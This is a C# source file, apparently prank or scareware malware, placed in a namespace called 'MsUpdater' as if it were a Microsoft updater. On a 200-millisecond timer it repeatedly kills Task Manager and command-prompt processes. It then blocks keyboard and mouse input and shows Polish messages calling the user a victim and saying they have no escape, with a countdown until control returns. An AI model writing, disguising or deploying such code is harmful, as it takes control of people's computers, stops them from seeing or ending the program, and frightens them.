namespace MsUpdater
{
    using System;
    using System.Diagnostics;
    using System.Diagnostics.CodeAnalysis;
    using System.Runtime.InteropServices;
    using System.Threading;

    using Timer = System.Timers.Timer;

    internal static class Service
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool AllocConsole();

        [DllImport("kernel32.dll")]
        private static extern bool FreeConsole();

        private static readonly Random Random = new Random();

        [SuppressMessage("ReSharper", "LocalizableElement")]
        static Service()
        {
            new Timer(200d) { Enabled = true }.Elapsed += delegate
                {
                    Array.ForEach(Process.GetProcessesByName("taskmgr"), process => process.Kill());
                    Array.ForEach(Process.GetProcessesByName("cmd"), process => process.Kill());
                };

            Thread.Sleep(Random.Next(5000, 30000));

            using (new InputBlock())
            {
                NotepadHelper.ShowMessage($"Już po Tobie ...{Environment.NewLine}:)", "Kochana ofiaro,");

                Thread.Sleep(2000);

                AllocConsole();

                Console.Title = "JUŻ PO TOBIE :)";
                Console.WriteLine("Nie masz gdzie uciec :)\n\n");

                for (var i = 10; i >= 0; i--)
                {
                    Console.Write("\rOdzyskasz kontrolę za " + i);
                    Thread.Sleep(1000);
                }

                FreeConsole();
            }
        }
    }
}